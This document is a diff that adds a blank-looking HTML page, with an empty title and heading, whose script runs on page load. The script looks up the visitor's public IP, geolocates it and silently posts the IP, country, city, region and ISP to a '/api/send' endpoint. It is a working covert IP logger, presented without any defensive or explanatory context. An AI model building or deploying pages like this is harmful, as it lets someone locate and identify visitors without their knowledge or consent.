@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title> </title>
+</head>
+<body>
+  <h2> </h2>
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        fetch(`https://ip-api.com/json/${ip}`)
+          .then(res => res.json())
+          .then(geo => {
+            fetch('/api/send', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                ip: ip,
+                country: geo.country,
+                city: geo.city,
+                region: geo.regionName,
+                isp: geo.isp
+              })
+            });
+          });
+      });
+  </script>
+</body>
+</html>
